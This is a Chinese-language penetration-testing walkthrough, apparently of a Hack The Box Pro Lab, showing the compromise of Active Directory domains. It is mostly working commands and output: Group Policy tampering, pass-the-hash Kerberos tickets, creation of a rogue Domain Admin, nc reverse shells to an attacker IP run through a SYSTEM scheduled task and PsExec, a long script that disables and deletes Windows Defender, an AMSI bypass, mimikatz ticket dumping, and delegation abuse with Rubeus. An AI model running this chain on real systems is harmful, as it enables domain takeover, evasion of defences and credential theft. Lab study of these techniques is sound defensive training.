18:SeDebugPrivilege = *S-1-5-32-544
19:SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
20:SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
21:SeInteractiveLogonRight = *S-1-5-32-555,*S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544                                                                                       
22:SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
23-SeMachineAccountPrivilege = *S-1-5-11
24:SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
25:SeProfileSingleProcessPrivilege = *S-1-5-32-544
26:SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
27:SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
28:SeSecurityPrivilege = *S-1-5-32-544
29:SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
30:SeSystemEnvironmentPrivilege = *S-1-5-32-544
31:SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544                                                                                                     
32:SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
33:SeTakeOwnershipPrivilege = *S-1-5-32-544
34:SeUndockPrivilege = *S-1-5-32-544
35:SeEnableDelegationPrivilege = *S-1-5-32-544
```

###### SID 对照表
| SID | 对应组 | 作用 |
| --- | --- | --- |
| `S-1-5-32-544` | **Administrators** | 本地管理员，拥有绝大部分特权。 |
| `S-1-5-32-549` | **Server Operators** | 可管理域控服务、备份/还原文件、修改系统时间。 |
| `S-1-5-32-551` | **Backup Operators** | 可绕过文件权限读取任何文件（如 `NTDS.dit`<br/>），是**域提权关键组**。 |
| `S-1-5-32-555` | **Remote Desktop Users** | 允许远程桌面登录。 |
| `S-1-5-32-554` | **Authenticated Users** | 任何经过认证的用户。 |
| `S-1-5-21-997099906-443949041-4154774969-1120` | **自定义域账户/组** | RID 为 `1120`<br/>，可能是某个特定用户或组。 |


---

###### 1.`1.SeBackupPrivilege` 和 `SeRestorePrivilege` 授予了 `Backup Operators` (`551`)
```plain
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
```

这意味着：

+ `**Backup Operators**`** 组成员可以无视文件权限读取域控上的任何文件**，包括 `C:\Windows\NTDS\NTDS.dit`（域数据库）和 `C:\Windows\System32\config\SAM`、`SYSTEM` 等注册表配置单元。
+ 如果能够**将 **`**backup$**`** 加入 **`**Backup Operators**`** 组**（需要 Domain Admin 或 ACL 写权限），即可直接备份 NTDS.dit 并离线提取所有域用户哈希。

###### 2.`2.SeBatchLogonRight` 包含一个自定义 SID `1120`
SeBatchLogonRight = *S-1-5-32-559,...,*S-1-5-21-997099906-443949041-4154774969-1120

+ 这个权限允许通过**计划任务**或**批处理作业**登录。
+ 拥有此权限的账户可能用于运行自动化任务，且往往配置了较高的服务权限。
+ **需要立即解析 SID **`**1120**`** 对应的账户名**，以判断其是否为高价值目标。

###### 3.`SeEnableDelegationPrivilege` 仅授予 `Administrators`
SeEnableDelegationPrivilege = *S-1-5-32-544

这是**安全最佳实践**，未出现低权限账户被授予该特权，因此无法直接滥用委派特权。

###### bloodhound查找
> + 前面那些大多是内置组 SID，比如 544/551/555
> + 只有最后这个 ...-1120 是一个**具体域对象的 RID**
> + 在默认 DC 策略里，给某个具体域用户单独配 Log on as a batch job，信号很强，不像普通默认项
>

```plain
MATCH (n)
WHERE n.objectid = "S-1-5-21-997099906-443949041-4154774969-1120"
RETURN n
```

![](/image/hackthebox-prolabs/Aptlabs-24.png)

自定义 SID `1120` 正是 `**remote_admin**` 域账户。该账户的关键属性如下：

| 属性 | 值 | 意义 |
| --- | --- | --- |
| `SAM Account Name` | `remote_admin` | 与域控自动登录配置中的 `DefaultUserName`<br/> 完全一致。 |
| `Enabled` | `TRUE` | 账户处于激活状态，可直接使用。 |
| `Password Never Expires` | `TRUE` | 密码永不过期，凭据长期有效。 |
| `Last Logon` | 2026-04-07 02:35 | 近期仍在活跃使用，会话可能仍存活。 |
| `Admin Count` | `FALSE` | **当前不是任何受保护组的成员**（但历史权限未知）。 |
| `User Account Control` | `66048` | 包含 `DONT_EXPIRE_PASSWORD`<br/> 和 `NORMAL_ACCOUNT`<br/>，无特殊委派标志。 |


###### 组策略添加
> 将GptTmpl上传到我们已经拿到shell的靶机192.168.24.112-SERVER04当中
>

```plain
$g='C:\GPO\GptTmpl.inf'
$l=Get-Content $g -Encoding Unicode | Where-Object { $_ -notmatch '^\?+$' }

$idx=[Array]::IndexOf([string[]]$l,'[Group Membership]')
if($idx -ge 0){ $l=$l[0..($idx-1)] }

$l += '[Group Membership]'
$l += '*S-1-5-21-997099906-443949041-4154774969-1109__Memberof = *S-1-5-32-544'
$l += '*S-1-5-21-997099906-443949041-4154774969-1109__Members ='
$l += '*S-1-5-21-997099906-443949041-4154774969-1116__Memberof = *S-1-5-32-544'
$l += '*S-1-5-21-997099906-443949041-4154774969-1116__Members ='

Set-Content -Path $g -Value $l -Encoding Unicode
Get-Content $g -Encoding Unicode | Select-String 'Group Membership|1109__|1116__'
```

###### GPT.INI 变更
> 更新策略版本号并回写，验证“改动可被客户端/DC感知”
>

```plain
copy "\\primary.megabank.local\SYSVOL\megabank.local\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}\GPT.INI" C:\GPO\GPT.INI
$p='C:\GPO\GPT.INI'
$c=Get-Content $p
$v=[int](($c | Where-Object {$_ -match '^Version='}) -replace 'Version=','')
($c -replace '^Version=\d+',"Version=$($v+1)") | Set-Content $p -Encoding ASCII
Get-Content $p
robocopy C:\GPO "\\primary.megabank.local\SYSVOL\megabank.local\Policies\{6AC1786C-016F-11D2-945F-00C04FB984F9}" GPT.INI /b /is /it /r:1 /w:1
```

```plain
Evil-WinRM shell v3.9
```

### Administrator
> 我们拿到了Administrator的Hash，这一点貌似没什么用，但是我们可以用来添加域管理
>

#### getTGT
```plain
proxychains -q getTGT.py MEGABANK.LOCAL/Administrator@megabank.local -hashes :41aa70e55117291f881dfd1ac40fdbbf -dc-ip 192.168.24.10
```

关键输出摘要：

+ `SMB ... STATUS_ACCOUNT_RESTRICTION`
+ `getTGT.py` 初次失败：`KRB_AP_ERR_SKEW(Clock skew too great)`
+ 通过 `remote_admin` WinRM 查询 `PRIMARY` 当前时间：`2026-04-07 15:25:41 -07:00`
+ 手工校时：`date -s '2026-04-08 06:25:41 +0800'`
+ 重新执行后成功：`[*] Saving ticket in Administrator@megabank.local.ccache`

#### bloodyAD
```plain
proxychains -q bloodyAD --host primary.megabank.local --dc-ip 192.168.24.10 -d MEGABANK.LOCAL -k ccache=/home/kali/Desktop/htb/Aptlabs/Administrator@megabank.local.ccache kdc=192.168.24.10 -- add user heathcliff 'Pass@123'
proxychains -q bloodyAD --host primary.megabank.local --dc-ip 192.168.24.10 -d MEGABANK.LOCAL -k ccache=/home/kali/Desktop/htb/Aptlabs/Administrator@megabank.local.ccache kdc=192.168.24.10 -- add groupMember 'Domain Admins' heathcliff
```

关键输出摘要：

+ `[+] heathcliff created`
+ `[+] heathcliff added to Domain Admins`

认证验证：

```plain
proxychains -q nxc winrm 192.168.24.10 -u heathcliff -p 'Pass@123' -d MEGABANK
proxychains -q nxc smb   192.168.24.10 -u heathcliff -p 'Pass@123' -d MEGABANK
proxychains -q nxc winrm 192.168.24.118 -u heathcliff -p 'Pass@123' -d MEGABANK
proxychains -q nxc smb   192.168.24.118 -u heathcliff -p 'Pass@123' -d MEGABANK
```

关键输出摘要：

+ `PRIMARY  WinRM [+] MEGABANK\\heathcliff:Pass@123 (Pwn3d!)`
+ `PRIMARY  SMB   [+] MEGABANK\\heathcliff:Pass@123 (Pwn3d!)`
+ `SERVER05 WinRM [+] MEGABANK\\heathcliff:Pass@123 (Pwn3d!)`
+ `SERVER05 SMB   [+] MEGABANK\\heathcliff:Pass@123 (Pwn3d!)`

结论：

+ 已获得一枚不受 `Protected Users` 限制的可直连域管账号
+ 其可直接用于 `PRIMARY` 和 `SERVER05` 的 WinRM/SMB 高权限落地

### 添加域管
```plain
net user heathcliff "Pass@123" /add /domain
net group "Domain Admins" heathcliff /add /domain
```

### 反弹system
#### 上传nc
```plain
*Evil-WinRM* PS C:\Users\heathcliff\Documents> upload "/home/kali/Desktop/tools/netcat/nc64.exe" "C:\Users\Public"
```

#### 计划任务
##### 监听
```plain
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# rlwrap ncat -lnvp 5556
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:5556
Ncat: Listening on 0.0.0.0:5556
```

##### 反弹
```plain
*Evil-WinRM* PS C:\> schtasks /create /tn bh_sys_nc /sc once /st 23:59 /ru SYSTEM /tr "C:\Users\Public\nc64.exe 10.10.16.14 5556 -e cmd.exe" /f
SUCCESS: The scheduled task "bh_sys_nc" has successfully been created.
```

```plain
*Evil-WinRM* PS C:\> schtasks /run /tn bh_sys_nc
SUCCESS: Attempted to run the scheduled task "bh_sys_nc".
```

#### Getshell
> 后续可以在system窗口直接反弹
>

```plain
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# rlwrap ncat -lnvp 5556
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:5556
Ncat: Listening on 0.0.0.0:5556
Ncat: Connection from 10.10.110.50:4146.
Microsoft Windows [Version 10.0.17763.6054]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

#### shell传递
> 由于计划任务已经执行无法重复，如果需要第二个systemshell窗口直接执行命令如下
>

```plain
start /B C:\Users\Public\nc64.exe -d 10.10.16.14 5556 -e cmd.exe
```

### Sharphound
#### upload
```plain
*Evil-WinRM* PS C:\Users\heathcliff\Documents> upload "/usr/share/sharphound/SharpHound.exe" "C:\Users\Public"
*Evil-WinRM* PS C:\> upload "/usr/share/sharphound/SharpHound.ps1" "C:\Users\Public"
```

#### run
> 通过system的shell运行
>

```plain
C:\Users\Public\SharpHound.exe -c All,GPOLocalGroup --zipfilename orbitfish_bh_full.zip --outputdirectory C:\Users\Public
```

### 关闭防护
```plain
sc stop WinDefend
sc config WinDefend start= disabled
sc stop SecurityHealthService
sc stop wuauserv
sc config wuauserv start= disabled
sc config SecurityHealthService start= disabled
netsh advfirewall set allprofiles state off
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d 4 /f
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter" /v "HideWindowsSecurityNotificationAreaControl" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableEnhancedNotifications" /v "value" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:windowsdefender;" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d 4 /f
powershell -Command "Stop-Service -Name WinDefend -Force"
powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"
powershell -Command "Stop-Service -Name WdNisSvc -Force"
powershell -Command "Set-Service -Name WdNisSvc -StartupType Disabled"
powershell -Command "Stop-Service -Name wscsvc -Force"
powershell -Command "Set-MpPreference -SpynetReporting Disabled -SubmitSamplesConsent NeverSend"
powershell -Command "Set-MpPreference -DisableCloudProtection $true -DisablePrivacyMode $true -PUAProtection Disabled"
powershell -Command "Set-Service -Name wscsvc -StartupType Disabled"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Stop-Service -Name WdNisDrv -Force 2>$null
sc config WdNisDrv start= disabled
Stop-Service -Name SecurityHealthService -Force
sc config SecurityHealthService start= disabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d 4 /f
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Idle Maintenance" /Disable
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 0 /f
net stop WinDefend /y
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
takeown /f "C:\Program Files\Windows Defender" /r
icacls "C:\Program Files\Windows Defender" /grant administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
sc config WinDefend start= disabled
powershell.exe -NoP -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
powershell.exe -NoP -Command "(Get-MpPreference).DisableRealtimeMonitoring"
powershell.exe -NoP -Command "(Get-MpComputerStatus).RealTimeProtectionEnabled"
cmd /c "sc query WinDefend"
cmd /c "sc stop WinDefend"
cmd /c "sc config WinDefend start= disabled"
cmd /c "sc query WinDefend"
```

#### upload

```plain
. C:\Users\Public\PowerView.ps1
```

##### SPN
```plain
PS C:\Windows\system32> Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw     
```

##### Azure AD Connect
> `MSOL_*` 账户通常是 **Azure AD Connect** 同步使用的服务账户，用于将本地 AD 用户同步到 Office 365 / Azure AD
>

```plain
PS C:\Windows\system32> Get-DomainUser -LDAPFilter '(samAccountName=MSOL_*)' | Format-List samaccountname,description,memberof,distinguishedname

samaccountname    : MSOL_2a1d03e02d11
description       : Account created by Microsoft Azure Active Directory Connect with installation identifier 
                    2a1d03e02d1142339cc24175b2a12a73 running on computer SRV001 configured to synchronize to tenant 
                    a67632354763outlook.onmicrosoft.com. This account must have directory replication permissions in 
                    the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.
distinguishedname : CN=MSOL_2a1d03e02d11,CN=Users,DC=OrbitFish,DC=local
```

```plain
PS C:\Windows\system32> Get-DomainUser -AdminCount | Select-Object samaccountname,memberof

samaccountname memberof                                                                                                
-------------- --------                                                                                                
Administrator  {CN=Group Policy Creator Owners,CN=Users,DC=OrbitFish,DC=local, CN=Domain Admins,CN=Users,DC=OrbitFis...
krbtgt         CN=Denied RODC Password Replication Group,CN=Users,DC=OrbitFish,DC=local  
```

```plain
MemberName   
----------   
Administrator
```

#### 基于资源的约束委派（**Resource-Based Constrained Delegation**）
##### 目标对象
> + 指令意义为RBCD 配在了哪些目标对象
> + SRV001 具有msDS-AllowedToActOnBehalfOfOtherIdentity
> + 如果msDS-AllowedToActOnBehalfOfOtherIdentity属性里写入了某个账户的 SID，就表示：**这个被授权的账户可以模拟任意域用户，向这台计算机发起 Kerberos 请求，访问这台计算机上的任何服务**
>

```plain
PS C:\Windows\system32> Get-DomainObject -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'

logoncount                               : 214
badpasswordtime                          : 12/31/1600 4:00:00 PM
distinguishedname                        : CN=SRV001,CN=Computers,DC=OrbitFish,DC=local
objectclass                              : {top, person, organizationalPerson, user...}

                                           1/13/2020 5:47:08 PM...}

                                           WSMAN/srv001.OrbitFish.local...}
```

##### 模拟用户
> **寻找 SRV001 计算机上 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中可以‘允许哪些账户模拟其他用户访问 SRV001’**
>

```plain
PS C:\Windows\system32> $raw=(Get-DomainObject -Identity 'SRV001' -Properties msds-allowedtoactonbehalfofotheridentity).'msds-allowedtoactonbehalfofotheridentity'; $sd=New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList ([byte[]]$raw),0; $sd.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-422340810-923920092-1608110645-1106
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```


### Bloodhound
> **SRV002 can CoerceToTGT**
>
> + SRV002 具有无约束委派能力(SRV002 = unconstrained delegation)
> + 所以可以诱导 SRV001 来向 SRV002 认证
> + 一旦成功，SRV001$ 的 TGT 就会落到 SRV002
> + 然后你就能拿这张票继续做 S4U，伪造成 管理用户去访问 srv001
>

![](/image/hackthebox-prolabs/Aptlabs-25.png)

> 拥有 Administrator -> 可以管 SRV002
>
> Administrator的Object中Marked Sensitive: TRUE
>
> 这对应着Account is sensitive and cannot be delegated
>
> **这个账号的 Kerberos 凭据不适合被委派，**它是受保护账号
>

![](/image/hackthebox-prolabs/Aptlabs-26.png)

### 横向移动
> 目前条件：
>
> + SRV002 上的 SYSTEM 已拿到 
> + 已经确认 SRV002 是 unconstrained delegation
> + unconstrained delegation 只表示“如果别的主体来认证到 SRV002，SRV002 有机会拿到可被滥用的 Kerberos 凭据”  
它**不会自动让 ****SRV001**** 主动来认证**
>
> 下一步要验证：能不能把 SRV001 的认证强制打到 SRV002 上
>
> + Print Spooler 是常见的“可被远程触发认证”的服务面之一。
> + 如果 SRV001 的 Spooler 开着、RPC 可达，攻击者常把它当成“让 SRV001$ 主动连出去”的入口。
> + 如果这个面不存在，你就算拿下了 SRV002 且它是 unconstrained delegation，**也不代表一定能收到 ****SRV001**** 的票据**。
>

#### spooler检测
> spooler 检测不是在验证 delegation 本身，而是在验证：
>
> + SRV001 上是否存在一个可被利用的“认证强制”入口
> + 这个入口是否能让 SRV001 对 SRV002 发起认证
>

```plain
PS C:\Windows\system32> sc.exe \\dc.OrbitFish.local query spooler
[SC] EnumQueryServicesStatus:OpenService FAILED 1060:
The specified service does not exist as an installed service.

PS C:\Windows\system32> sc.exe \\SRV001 query spooler
SERVICE_NAME: spooler 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

#### shell1：Rubeus
> 在**第一个 SRV002 SYSTEM shell** 里执行：
>
> `C:\Users\Public\Rubeus.exe monitor /interval:1`
>
> 强制 SRV001 向 SRV002 发起打印通知相关认证。
>

##### upload
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/Rubeus/2.2.0]
└─# updog -p 88

[+] Serving /home/kali/Desktop/tools/Rubeus/2.2.0 on 0.0.0.0:88...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.                                                                                            
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:88
 * Running on http://61.139.2.134:88
Press CTRL+C to quit
```

```plain
powershell -c "iwr http://10.10.16.14:88/Rubeus2.2.exe -OutFile C:\Users\Public\Rubeus.exe"
```

##### run
> + 强制 SRV001 向 SRV002 发起打印通知相关认证。
> + 让 Rubeus 每隔 **1 秒** 检查一次当前系统的 Kerberos 票据缓存。
> + 一旦发现有 **新的 TGT** 被添加到缓存中，就会立即打印出票据的详细信息。
> + 验证 Spooler 这条 coercion 能不能把 SRV001 的认证真正打到 SRV002
>

##### rubeus输出
> SRV001$ 的 **TGT 已经真的落到 SRV002 上了**。这说明无约束委派 + coercion 这段链条是通的。  
所以下一步最自然的不是继续猜 SID 1106，也不是直接跳到 AD Connect，而是先把这张 **SRV001$**** 的 TGT** 换成对 SRV001 的服务票，验证我们是否真的能碰到 \\srv001\c$01$ @ ORBITFISH.LOCAL 相关票据

#### 票据注入


###### run
```plain
*Evil-WinRM* PS C:\Users\Public> C:\Users\Public\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

###### 票据列表（失败）
> 目录里的 .kirbi **全是 ****SRV002$**** 的票**，没有 SRV001$@krbtgt，所以**不能直接拿这些文件继续换 ****srv001**** 的票**。
>

##### base64导入rubeus
```plain
C:\Users\Public\Rubeus.exe s4u /impersonateuser:Administrator /ticket:这里粘贴shell1里那一整行单行base64 /altservice:cifs/srv001.orbitfish.local /self /dc:dc.orbitfish.local /ptt
```

#### 反弹shell
##### nc导入
```plain
copy C:\Users\Public\nc64.exe \\srv001.orbitfish.local\c$\ProgramData\nc64.exe
```

##### PsExec.exe
###### upload
```plain
*Evil-WinRM* PS C:\Users\Public> upload "/home/kali/Desktop/tools/Pstools/PsExec64.exe" "C:\Users\Public\PsExec64.exe"
```

###### run
```plain
rlwrap ncat -lnvp 5560
```

```plain
C:\Users\Public\PsExec64.exe -accepteula -d -s \\srv001.orbitfish.local C:\ProgramData\nc64.exe 10.10.16.14 5560 -e cmd.exe
```

##### Getshell
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb]
└─# rlwrap ncat -lnvp 5560

Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:5560
Ncat: Listening on 0.0.0.0:5560
Ncat: Connection from 10.10.110.50:10085.
Microsoft Windows [Version 10.0.17763.6054]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

##### shell传递
```plain
start /B C:\ProgramData\nc64.exe -d 10.10.16.14 5560 -e cmd.exe
```

### 关闭防护
```plain
sc stop WinDefend
sc config WinDefend start= disabled
sc stop SecurityHealthService
sc stop wuauserv
sc config wuauserv start= disabled
sc config SecurityHealthService start= disabled
netsh advfirewall set allprofiles state off
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d 4 /f
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter" /v "HideWindowsSecurityNotificationAreaControl" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableEnhancedNotifications" /v "value" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:windowsdefender;" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d 4 /f
powershell -Command "Stop-Service -Name WinDefend -Force"
powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"
powershell -Command "Stop-Service -Name WdNisSvc -Force"
powershell -Command "Set-Service -Name WdNisSvc -StartupType Disabled"
powershell -Command "Stop-Service -Name wscsvc -Force"
powershell -Command "Set-MpPreference -SpynetReporting Disabled -SubmitSamplesConsent NeverSend"
powershell -Command "Set-MpPreference -DisableCloudProtection $true -DisablePrivacyMode $true -PUAProtection Disabled"
powershell -Command "Set-Service -Name wscsvc -StartupType Disabled"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Stop-Service -Name WdNisDrv -Force 2>$null
sc config WdNisDrv start= disabled
Stop-Service -Name SecurityHealthService -Force
sc config SecurityHealthService start= disabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d 4 /f
